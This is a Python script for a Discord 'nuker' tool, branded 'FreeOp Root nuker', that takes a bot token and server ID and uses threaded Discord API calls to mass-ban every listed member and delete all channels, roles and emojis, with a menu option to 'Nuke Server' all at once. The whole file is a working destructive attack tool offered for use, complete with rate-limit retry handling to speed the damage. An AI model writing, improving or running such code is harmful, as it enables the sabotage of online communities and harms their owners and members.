import requests
import os
import threading, time
from colorama import Fore, Style
members = open('members.txt')
channels = open('channels.txt')
roles = open('roles.txt')
emojis = open('emojis.txt')
token = input("Token: ")
guild = input("Guild: ")
os.system('clear')
headers = {'Authorization': "Bot " + token}
def ban(i):
    while True:
      r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
      if 'retry_after' in r.text:
          time.sleep(r.json()['retry_after'])
          print(f"Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
      else:
          break
def channel_delete(u):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
       if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
          break
def role(k):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{k}", headers=headers)
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
           break
def emoji(a):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/emojis/{a}", headers=headers)
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
            break
def banall():   
     for m in members:
         x = threading.Thread(target=ban, args=(m,))
         x.start()
def channelsdel():
     for c in channels:
         y = threading.Thread(target=channel_delete, args=(c,))
         y.start()
def rolesdel():
     for r in roles:
         z = threading.Thread(target=role, args=(r,))
         z.start()
def emojisdel():  
     for e in emojis:
         h = threading.Thread(target=emoji, args=(e,))
         h.start()      
print(Fore.RED + r'''

────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████████████───██████─────────██████████████─██████████████─██████████████─██████████████─██████████████─
─██░░░░░░░░░░██───██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░██████░░██───██░░██─────────██░░██████░░██─██░░██████████─██████░░██████─██░░██████░░██─██░░██████░░██─
─██░░██──██░░██───██░░██─────────██░░██──██░░██─██░░██─────────────██░░██─────██░░██──██░░██─██░░██──██░░██─
─██░░██████░░████─██░░██─────────██░░██████░░██─██░░██████████─────██░░██─────██░░██──██░░██─██░░██████░░██─
─██░░░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─────██░░██─────██░░██──██░░██─██░░░░░░░░░░██─
─██░░████████░░██─██░░██─────────██░░██████░░██─██████████░░██─────██░░██─────██░░██──██░░██─██░░██████████─
─██░░██────██░░██─██░░██─────────██░░██──██░░██─────────██░░██─────██░░██─────██░░██──██░░██─██░░██─────────
─██░░████████░░██─██░░██████████─██░░██──██░░██─██████████░░██─────██░░██─────██░░██████░░██─██░░██─────────
─██░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─────██░░██─────██░░░░░░░░░░██─██░░██─────────
─████████████████─██████████████─██████──██████─██████████████─────██████─────██████████████─██████─────────
────────────────────────────────────────────────────────────────────────────────────────────────────────────   
                                       
1 ; Ban Members - FreeOp
2 ; Del Channels - FreeOp  
3 ; Del Roles - FreeOp  
4 ; Del Emojis - FreeOp
5 ; Nuke Server - FreeOp           
''' + Style.RESET_ALL)
while True:
    x = input("> ")
    if x == "1":
        banall()
        print('Banning all members with the speed of 40bans/sec.')
    elif x == "2":
        channelsdel()
        print("Deleting All Channels with Speed of 10+ Channels Per Second.")
    elif x == "3":
        rolesdel()
        print("Deleting All Roles with Speed of 10+ Roles Per Second.")
    elif x =="4":
        emojisdel()
        print("Deleting All Emojis with Speed of 5+ Emojis Per Second.")
    elif x=="5":
        banall()
        print("Banning all Members with Speed x 40+ Per Second.")
        channelsdel()
        print("Deleting All Channels with Speed of 10+ Channels Per Second.")
        rolesdel()
        print("Deleting All Roles with Speed of 10+ Roles Per Second.")
        emojisdel()
        print("Deleting All Emojis with Speed of 5+ Emojis Per Second.")
        print("[SUCCESS] - The Server has been nuked.\n Thanks for using FreeOp Root nuker") 
